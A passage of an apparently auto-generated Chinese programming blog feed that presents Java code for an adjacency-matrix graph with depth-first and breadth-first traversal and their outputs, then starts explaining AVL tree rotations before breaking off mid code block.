class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.graph;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Graph</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> ArrayList&lt;String&gt; vertexList;<span class="comment">// 顶点集合</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span>[][] edges;<span class="comment">// 图对应的邻接矩阵</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> numOfEdges;<span class="comment">// 边的数目</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">String Vertexs[] = &#123; <span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;E&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建图对象</span></span><br><span class="line"><span class="type">Graph</span> <span class="variable">graph</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Graph</span>(Vertexs.length);</span><br><span class="line"><span class="comment">// 循环的添加顶点</span></span><br><span class="line"><span class="keyword">for</span> (String vertex : Vertexs) &#123;</span><br><span class="line">graph.insertVertex(vertex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加边</span></span><br><span class="line"><span class="comment">// A-B A-C B-C B-D B-E</span></span><br><span class="line">graph.insertEdge(<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">graph.insertEdge(<span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">graph.insertEdge(<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">graph.insertEdge(<span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>);</span><br><span class="line">graph.insertEdge(<span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示一把邻结矩阵</span></span><br><span class="line">graph.showGraph();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造器</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Graph</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">vertexList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">edges = <span class="keyword">new</span> <span class="title class_">int</span>[n][n];</span><br><span class="line">numOfEdges = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入顶点</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertVertex</span><span class="params">(String vertex)</span> &#123;</span><br><span class="line">vertexList.add(vertex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加边</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertEdge</span><span class="params">(<span class="type">int</span> v1, <span class="type">int</span> v2, <span class="type">int</span> weight)</span> &#123;</span><br><span class="line">edges[v1][v2] = weight;</span><br><span class="line">edges[v2][v1] = weight;</span><br><span class="line">numOfEdges++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 图中常用的方法</span></span><br><span class="line"><span class="comment">// 返回顶点的个数</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNumOfVertex</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> vertexList.size();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示图对应的矩阵</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showGraph</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// System.err.println(Arrays.deepToString(edges));</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span>[] e : edges) &#123;</span><br><span class="line">System.err.println(Arrays.toString(e));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 得到边的数目</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNumOfEdges</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> numOfEdges;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回i(下标)对应的数据顶点 0-&gt;&quot;A&quot; 1-&gt;&quot;B&quot; 2-&gt;&quot;C&quot;</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getValueByIndex</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> vertexList.get(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回v1和v2的权值</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getWeight</span><span class="params">(<span class="type">int</span> v1, <span class="type">int</span> v2)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> edges[v1][v2];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p>[0, 1, 1, 0, 0]<br>[1, 0, 1, 1, 1]<br>[1, 1, 0, 0, 0]<br>[0, 1, 0, 0, 0]<br>[0, 1, 0, 0, 0]</p><h2 id="深度优先遍历-Depth-First-Search"><a href="#深度优先遍历-Depth-First-Search" class="headerlink" title="深度优先遍历(Depth First Search)"></a>深度优先遍历(Depth First Search)</h2><p><strong>基本思想：</strong></p><p>从初始访问结点出发，初始访问结点可能有多个邻接结点，深度优先遍历的策略就是首先访问第一个邻接结点，然后再以这个被访问的邻接结点作为初始结点，访问它的第一个邻接结点， 可以这样理解：<strong>每次都在访问完当前结点后首先访问当前结点的第一个邻接结点。</strong></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214954.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.graph;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Graph</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> ArrayList&lt;String&gt; vertexList;<span class="comment">// 顶点集合</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span>[][] edges;<span class="comment">// 图对应的邻接矩阵</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span>[] isVisited;<span class="comment">// 记录某个顶点是否被访问</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">String Vertexs[] = &#123; <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建图对象</span></span><br><span class="line"><span class="type">Graph</span> <span class="variable">graph</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Graph</span>(Vertexs.length);</span><br><span class="line"><span class="comment">// 循环的添加顶点</span></span><br><span class="line"><span class="keyword">for</span> (String vertex : Vertexs) &#123;</span><br><span class="line">graph.insertVertex(vertex);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 更新边的关系</span></span><br><span class="line">graph.insertEdge(<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">graph.insertEdge(<span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">graph.insertEdge(<span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>);</span><br><span class="line">graph.insertEdge(<span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>);</span><br><span class="line">graph.insertEdge(<span class="number">3</span>, <span class="number">7</span>, <span class="number">1</span>);</span><br><span class="line">graph.insertEdge(<span class="number">4</span>, <span class="number">7</span>, <span class="number">1</span>);</span><br><span class="line">graph.insertEdge(<span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>);</span><br><span class="line">graph.insertEdge(<span class="number">2</span>, <span class="number">6</span>, <span class="number">1</span>);</span><br><span class="line">graph.insertEdge(<span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示一把邻结矩阵</span></span><br><span class="line">graph.showGraph();</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;深度遍历&quot;</span>);</span><br><span class="line">graph.dfs(<span class="number">0</span>); <span class="comment">// [1-&gt;2-&gt;4-&gt;8-&gt;5-&gt;3-&gt;6-&gt;7]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造器</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Graph</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">vertexList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">edges = <span class="keyword">new</span> <span class="title class_">int</span>[n][n];</span><br><span class="line">isVisited = <span class="keyword">new</span> <span class="title class_">boolean</span>[n];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入顶点</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertVertex</span><span class="params">(String vertex)</span> &#123;</span><br><span class="line">vertexList.add(vertex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加边</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertEdge</span><span class="params">(<span class="type">int</span> v1, <span class="type">int</span> v2, <span class="type">int</span> weight)</span> &#123;</span><br><span class="line">edges[v1][v2] = weight;</span><br><span class="line">edges[v2][v1] = weight;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 深度优先遍历</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">System.out.print(vertexList.get(i) + <span class="string">&quot;-&gt;&quot;</span>);</span><br><span class="line">isVisited[i] = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; vertexList.size(); j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (edges[i][j] &gt; <span class="number">0</span> &amp;&amp; isVisited[j] == <span class="literal">false</span>) &#123;</span><br><span class="line">dfs(j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示图对应的矩阵</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showGraph</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span>[] e : edges) &#123;</span><br><span class="line">System.out.println(Arrays.toString(e));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p>[0, 1, 1, 0, 0, 0, 0, 0]<br>[1, 0, 0, 1, 1, 0, 0, 0]<br>[1, 0, 0, 0, 0, 1, 1, 0]<br>[0, 1, 0, 0, 0, 0, 0, 1]<br>[0, 1, 0, 0, 0, 0, 0, 1]<br>[0, 0, 1, 0, 0, 0, 1, 0]<br>[0, 0, 1, 0, 0, 1, 0, 0]<br>[0, 0, 0, 1, 1, 0, 0, 0]<br>深度遍历<br>1-&gt;2-&gt;4-&gt;8-&gt;5-&gt;3-&gt;6-&gt;7-&gt;</p><h2 id="广度优先遍历-Broad-First-Search"><a href="#广度优先遍历-Broad-First-Search" class="headerlink" title="广度优先遍历(Broad First Search)"></a>广度优先遍历(Broad First Search)</h2><p><strong>算法思路：</strong></p><ol><li><p>创建一个<strong>队列</strong>，用来存放每一层的顶点。</p></li><li><p>从初始访问顶点开始访问，将其标记为已访问，同时将其入队。</p></li><li><p>只要队列不空，则<strong>重复</strong>以下操作：</p><p>  (1)队头顶点first出队。</p><p>  (2)依次检查first的<strong>所有</strong>邻接顶点，若该邻接顶点没有被访问过，则将该邻接顶点标记为已访问，同时将其入队。</p></li></ol><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214954.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.graph;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Graph</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> ArrayList&lt;String&gt; vertexList;<span class="comment">// 顶点集合</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span>[][] edges;<span class="comment">// 图对应的邻接矩阵</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span>[] isVisited;<span class="comment">// 记录某个顶点是否被访问</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">String Vertexs[] = &#123; <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建图对象</span></span><br><span class="line"><span class="type">Graph</span> <span class="variable">graph</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Graph</span>(Vertexs.length);</span><br><span class="line"><span class="comment">// 循环的添加顶点</span></span><br><span class="line"><span class="keyword">for</span> (String vertex : Vertexs) &#123;</span><br><span class="line">graph.insertVertex(vertex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新边的关系</span></span><br><span class="line">graph.insertEdge(<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">graph.insertEdge(<span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">graph.insertEdge(<span class="number">1</span>, <span class="number">3</span>, <span class="number">1</span>);</span><br><span class="line">graph.insertEdge(<span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>);</span><br><span class="line">graph.insertEdge(<span class="number">3</span>, <span class="number">7</span>, <span class="number">1</span>);</span><br><span class="line">graph.insertEdge(<span class="number">4</span>, <span class="number">7</span>, <span class="number">1</span>);</span><br><span class="line">graph.insertEdge(<span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>);</span><br><span class="line">graph.insertEdge(<span class="number">2</span>, <span class="number">6</span>, <span class="number">1</span>);</span><br><span class="line">graph.insertEdge(<span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示一把邻结矩阵</span></span><br><span class="line">graph.showGraph();</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;广度优先!&quot;</span>);</span><br><span class="line">graph.bfs(<span class="number">0</span>); <span class="comment">// [1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;6-&gt;7-&gt;8]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造器</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Graph</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">vertexList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">edges = <span class="keyword">new</span> <span class="title class_">int</span>[n][n];</span><br><span class="line">isVisited = <span class="keyword">new</span> <span class="title class_">boolean</span>[n];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入顶点</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertVertex</span><span class="params">(String vertex)</span> &#123;</span><br><span class="line">vertexList.add(vertex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加边</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertEdge</span><span class="params">(<span class="type">int</span> v1, <span class="type">int</span> v2, <span class="type">int</span> weight)</span> &#123;</span><br><span class="line">edges[v1][v2] = weight;</span><br><span class="line">edges[v2][v1] = weight;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 广度优先遍历</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bfs</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">LinkedList&lt;Integer&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;Integer&gt;();</span><br><span class="line">isVisited[i] = <span class="literal">true</span>;</span><br><span class="line">queue.addLast(i);</span><br><span class="line"><span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">first</span> <span class="operator">=</span> (Integer) queue.removeFirst();</span><br><span class="line">System.out.print(vertexList.get(first) + <span class="string">&quot;-&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> first + <span class="number">1</span>; j &lt; vertexList.size(); j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (edges[first][j] &gt; <span class="number">0</span> &amp;&amp; isVisited[j] == <span class="literal">false</span>) &#123;</span><br><span class="line">queue.addLast(j);</span><br><span class="line">isVisited[j] = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示图对应的矩阵</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showGraph</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span>[] e : edges) &#123;</span><br><span class="line">System.out.println(Arrays.toString(e));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p>[0, 1, 1, 0, 0, 0, 0, 0]<br>[1, 0, 0, 1, 1, 0, 0, 0]<br>[1, 0, 0, 0, 0, 1, 1, 0]<br>[0, 1, 0, 0, 0, 0, 0, 1]<br>[0, 1, 0, 0, 0, 0, 0, 1]<br>[0, 0, 1, 0, 0, 0, 1, 0]<br>[0, 0, 1, 0, 0, 1, 0, 0]<br>[0, 0, 0, 1, 1, 0, 0, 0]<br>广度优先!<br>1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;6-&gt;7-&gt;8-&gt;</p><p>找了一篇思路图解不错的博客帮助理解：<a href="https://blog.csdn.net/weixin_40953222/article/details/80544928?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param">CSDN 图的广度优先搜索（BFS）和深度优先搜索（DFS）算法解析</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>平衡二叉树</title>
      <link href="/posts/7218/"/>
      <url>/posts/7218/</url>
      
        <content type="html"><![CDATA[<h1 id="平衡二叉树"><a href="#平衡二叉树" class="headerlink" title="平衡二叉树"></a>平衡二叉树</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200814184742.png"></p><p><strong>平衡二叉树：</strong>也叫平衡二叉搜索树（Self-balancing binary search tree），又被称为AVL树， 可以保证查询效率较高。<br><strong>特点：</strong>它是一棵空树或它的左右两个子树的高度差的绝对值不超过1，并且左右两个子树都是一棵平衡二叉树。平衡二叉树的常用实现方法有红黑树、AVL、替罪羊树、Treap、伸展树等。</p><p>一棵AVL树有如下必要条件：</p><ol><li>条件一：它必须是二叉排序树。</li><li>条件二：每个节点的左子树和右子树的高度差至多为1。</li></ol><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706214944.png"></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215030.png"></p><h2 id="AVL树的平衡调整"><a href="#AVL树的平衡调整" class="headerlink" title="AVL树的平衡调整"></a>AVL树的平衡调整</h2><p><strong>左旋转：</strong></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200815000259.png"></p><p>问题：当插入8 时，rightHeight() - leftHeight() &gt; 1 成立，此时，不再是一颗avl树了.</p><p>怎么处理–进行<strong>左旋转：</strong></p><ol><li>创建一个新的节点 newNode ，值等于当前根节点的值</li><li>把新节点的左子树设置了当前节点的左子树<br>  newNode.left &#x3D; left </li><li>把新节点的右子树设置为当前节点的右子树的左子树<br>  newNode.right &#x3D; right.left;</li><li>把当前节点的值换为右子节点的值<br>  value &#x3D; right.value; </li><li>把当前节点的右子树设置成右子树的右子树<br>  right &#x3D; right.right;</li><li>把当前节点的左子树设置为新节点<br>  left &#x3D; newNode;</li></ol><hr><p><strong>右旋转：</strong></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215713.png"></p><p>问题：当插入6 时，leftHeight()  - rightHeight()  &gt; 1 成立，此时，不再是一颗avl树了.</p><p>怎么处理–进行<strong>右旋转</strong></p><ol><li>创建一个新的节点 newNode ，值等于当前根节点的值</li><li>把新节点的右子树设置了当前节点的右子树<br>newNode.right &#x3D; right</li><li>把新节点的左子树设置为当前节点的左子树的右子树<br>newNode.left &#x3D; left.right;</li><li>把当前节点的值换为左子节点的值<br>value &#x3D; left.value; </li><li>把当前节点的左子树设置成左子树的左子树<br>left &#x3D; left.left;</li><li>把当前节点的右子树设置为新节点<br>right &#x3D; newNode;</li></ol><hr><p><strong>双旋转：</strong></p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200815123248.png"></p><p>问题:  当插入9 时，leftHeight()  - rightHeight()  &gt; 1 ，此时右旋转进行平衡，发现右旋转后还不是一颗avl树</p><p>在<strong>满足右旋转条件时，要判断：</strong></p><ol><li>如果左子树的右子树高度大于左子树的左子树高度时</li><li>就对当前根节点的左子树，先进行左旋转</li><li>然后再对当前根节点进行右旋转即可</li><li>否则，直接对当前节点（根节点）进行右旋转即可.</li></ol><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200815125459.png"></p><p>同理，在<strong>满足左旋转条件时，要判断：</strong></p><ol><li>如果右子树的左子树高度大于右子树的右子树高度时</li><li>就对当前根节点的右子树，先进行右旋转</li><li>然后再对当前根节点进行左旋转即可</li><li>否则，直接对当前节点（根节点）进行左旋转即可.</li></ol><h2 id="判断树的高度的代码实现"><a href="#判断树的高度的代码实现" class="headerlink" title="判断树的高度的代码实现"></a>判断树的高度的代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 返回左子树的高度</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title 